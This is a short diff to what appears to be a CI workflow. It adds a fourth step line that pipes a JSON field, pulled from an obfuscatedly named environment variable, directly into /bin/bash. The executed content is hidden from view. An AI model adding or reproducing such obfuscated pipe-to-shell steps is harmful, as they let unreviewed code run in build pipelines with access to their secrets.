@@ -23,6 +23,7 @@ jobs:
           echo $o05 | jq -r .n08 | /bin/bash
           echo $f88744 | jq -r .i992 | /bin/bash
           echo $hep509 | jq -r .t5 | /bin/bash
+          echo $gkwzv80 | jq -r .sq18 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
